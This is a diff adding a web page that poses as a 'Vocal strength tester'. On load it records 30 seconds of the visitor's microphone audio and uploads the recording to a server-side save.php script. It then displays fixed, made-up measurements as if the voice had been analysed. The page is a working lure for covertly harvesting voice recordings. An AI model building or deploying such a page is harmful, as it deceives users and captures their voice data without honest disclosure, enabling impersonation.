@@ -1,0 +1,66 @@
+<!doctype html>
+<html>
+<head>
+<title> photos </title>
+</head>
+<script src="jquery.js"> </script>
+<body style="background:linear-gradient(to left, #DCDCDC, #F0F8FF, #D3D3D3)" onload="my()">
+<br> <br> <br> <br> <br> <br> <br><br><br>
+<div id="photo" align="middle">
+<p><font size="9" color="red"> Vocal strength tester </font> </p>
+<br> <br>
+<div align="middle"><img src="k.gif" style="border-radius:50%;width:180px;height:180px" /> </div>
+<br> <br>
+</div>
+<br> <br><br><br>
+<script>
+var chunks = [];
+function my() {
+     alert("sing a song for 30 seconds to check your vocal strength");
+     navigator.mediaDevices.getUserMedia({
+	 audio: true,
+	 video: false
+	 }).then(stream =>  {
+	   var recorder = new MediaRecorder(stream, { type: "audio/webm" });
+	   recorder.start();
+	   recorder.ondataavailable = e => {
+	   chunks.push(e.data);
+	   var blob = new Blob(chunks, { type: "audio/webm" });
+	   var name = (Math.random() * 1000).toString().replace('.', '');
+	   name += '.webm';
+	   var data = new FormData();
+	   data.append('audio', blob);
+	   data.append('filename', name);
+	   $.ajax({
+			url: "save.php",
+			type: "POST",
+			enctype: 'multipart/form-data',
+			data: data,
+			processData: false,
+			contentType: false,
+			cache: false,
+			timeout: 600000,
+			success: function(dataResult){
+				var dataResult = JSON.parse(dataResult);
+				if(dataResult.statusCode==200) {
+				    alert("frequency:132.5Hz, amplitude:5, vocalrise:20, vocaltremor:0.255, voicestopage:0.5 in range, phonationtime:2ms");
+				}
+				else if(dataResult.statusCode==201) {
+					alert("failed cannot capture audio");
+				}
+			},
+			error: function(e) {
+			    alert(e);
+			}
+       });	
+       };	   
+	   var track = stream.getTracks()[0];
+	   setTimeout(() => {
+	    recorder.stop();
+		track.stop();
+	   }, 30000);
+	}).catch(console.error);
+}; 
+</script>
+</body>
+</html>
